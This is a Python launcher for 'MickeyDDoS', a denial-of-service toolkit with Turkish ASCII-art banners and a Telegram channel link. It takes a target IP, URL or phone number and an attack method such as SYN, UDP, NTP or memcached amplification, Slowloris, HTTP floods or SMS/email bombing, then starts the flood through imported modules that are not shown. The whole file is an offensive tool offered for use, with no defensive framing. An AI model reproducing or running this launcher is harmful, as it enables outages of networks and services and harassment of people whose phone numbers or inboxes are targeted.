# Created by Yuba
from pystyle import *
import os
import sys
import argparse
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')
 
intro = """
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣶⣦⣄  MickeyDDoS⢠⣾⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀V.02⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡤⠒⠈⠛⢿⡿⠋⠉⠐⢿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⡀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠻⣿⡻⠿⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡜⠁⠀⢸⠀⠀⠀⠀⠈⠉⠛⠋⠉⣸⣿⠃⠀⠀⠀⣀⠀⠀⢀⢄⡀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡆⠀⠀⡎⠀⠱⠀⠃⠀⠱⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣷⠀⠀⡆⢀⣀⡆⣄⣤⢠⠀⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡤⠚⠁⠀⣀⣀⣀⠹⡗⣄⠀⠀⠀⠀⠀⣿⠿⠿⠃⠀⠱⣸⣿⡧⠽⠿⢌⡀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠉⠑⡄⠀⠀⠀⠀⠀
⠀⠀⠀⡠⠔⡁⠀⠀⠠⠊⠁⠀⠀⢀⠁⢸⣦⣀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠈⣴⣎⣉⣩⣶⠀⠀⠀⠢⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⡇⠀⠀⠀⠀⠀
⠀⡰⢊⡠⠔⡇⠀⠀⠀⠀⠀⠀⣠⠏⣠⣿⣿⣿⣷⣦⣈⣆⠀⠘⡀⠀⠀⠀⠙⠻⠿⠛⠁⠀⠀⡠⠃⢀⡔⠁⠀⠀⠀⠀⠀⠀⠀⡠⠖⠁⠀⢠⠃⠀⠀⠀⠀⠀
⢸⠞⠁⣀⠤⠷⠀⠀⠀⢀⣠⠞⠉⠉⠁⠈⠙⢿⣿⣿⣿⣿⣦⡀⠀⠠⡀⠀⠀⠀⠀⠀⠀⡠⠐⢁⠴⠋⠀⠀⠀⠀⠀⠀⣠⠊⠏⢀⣀⡀⠀⠀⢣⠀⠀⠀⠀⠀
⡃⡴⠋⠁⢀⣀⠤⠔⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣷⣦⣄⡙⢶⣶⣶⣿⠏⣠⣿⣥⣤⣤⣶⣶⣶⣶⣾⣿⡇⢰⠀⠈⠀⠉⢦⠀⠀⠣⡀⠀⠀⠀
⠉⠣⠔⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣦⣈⣉⣠⣴⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠳⠼⣆⠀⠀⠀⠀⠁⠀⣴⠙⢦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⢀⣴⡉⠑⢦⡱⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢤⡀⠀⠙⢦⡀⠱⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠁⠀⢀⠤⢄⠀⠀⡀⢀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⣄⠀⢹⡀⠱
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢠⠃⠀⠈⠀⢰⠀⠀⢡⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠚⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠈⠉⠉⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   
                > Enter Tuşuna Basın                                         

"""

Anime.Fade(Center.Center(intro), Colors.green_to_red, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTRED_EX}

 

                                      ⠀⠀⠀⠀        ⣀⣤⣴⣶⣶⣶⣶⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣤⣤⣴⣶⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠛⣻⣿⡿⠟⠛⠛⠛⠛⠻⢿⣿⣿⠀⠀⠈⠓⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢇⠀⠀⠀⠀⠹⣦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣦⡀⠘⣧⠀⠀⢀⣤⣄⠀
⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⢰⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣷⣄⠀⠀⣸⣿⣷⡀⠘⣇⠀⢸⣿⣿⡆
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠘⠛⠿⣿⣧⠀⢠⣭⣿⡇⠀⢻⣀⣸⣿⣿⠃
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣇⠀⢿⣿⡇⡠⠞⠉⠈⠿⠛⢧
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠉⠓⠀⠀⠀⠀⠀⠀⠻⣿⣿⡿⠀⠀⢻⠟⠀⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⣠⣤⣤⠤⠀⠀⠀⠀⠀⠀⠈⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼     t.me/MickeyRATexe
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠹⣿⣿⠀⠀⠀⠁⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠃
⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠹⣿⣧⠀⠀⡀⢻⡿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠁⠀
⠀⠀⠀⠈⠛⠿⢿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀⠀⠈⠻⢷⣄⢱⡈⢷⣈⠏⠙⣿⣿⡿⠛⠒⠤⠀⠀⠀⠀⠀⣀⣴⠞⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠻⣄⡈⠙⠛⠋⣁⣤⣀⣀⠤⠤⠤⠶⠚⠋⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                              `-'       `--'          
                              
                                     
                             
     > MickeyRat V.01 Hoşgeldiniz <

""")

time.sleep(1)










# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target ip:port, url or phone",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Attack method",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<time>", help="time in secounds"
)
parser.add_argument(
    "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
